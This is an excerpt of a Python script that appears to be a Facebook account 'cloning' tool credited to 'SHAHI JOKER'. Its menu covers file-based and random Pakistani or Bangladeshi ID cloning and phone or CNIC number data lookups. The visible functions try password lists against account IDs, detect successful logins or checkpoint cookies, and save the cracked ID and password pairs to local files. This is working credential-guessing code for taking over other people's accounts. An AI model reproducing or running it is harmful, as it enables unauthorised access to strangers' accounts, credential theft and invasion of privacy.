...
→   Owner      : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 
→   Facebook   :  𝐌𝐑 𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑
→   Github     :  𝐋𝐓𝐗 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
→   Tool Type  :  \x1b[1;91m𝐅𝐑𝐄𝐄
...
def menu():
			...
			os.system('clear')
			print(logo)
			print('[1] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐌𝐄𝐍𝐔')
			print('[2] 𝐏𝐀𝐊 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐌𝐄𝐍𝐔')
			print('[3] 𝐁𝐃 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐌𝐄𝐍𝐔')
			print('[4] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐇𝐎𝐈𝐂𝐄 𝐏𝐀𝐒𝐒 ')
			print('[5] 𝐆𝐄𝐓 𝐀𝐍𝐘 𝐍𝐔𝐌𝐁𝐄𝐑 𝐃𝐀𝐑𝐀')
			print('[6] 𝐆𝐄𝐓 𝐀𝐍𝐘 𝐂𝐍𝐈𝐂 𝐍𝐔𝐌𝐁𝐄𝐑 𝐃𝐀𝐑𝐀')
			print('[7] 𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐄 𝐎𝐍 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊')
			print('\x1b[1;91m[8] 𝐄𝐗𝐈𝐓 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mLTX_JOKER\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[LTX_JOKER-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/LTX_JOKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[LTX_JOKER-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/LTX_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[LTX_JOKER-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/LTX_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[LTX_JOKER-OK] '+cid+' | '+ps+'\033[1;32m')
				open('LTX_JOKER-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[LTX_JOKER-CP] '+cid+' | '+ps+'\33[0;97m')
				open('LTX_JOKER-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
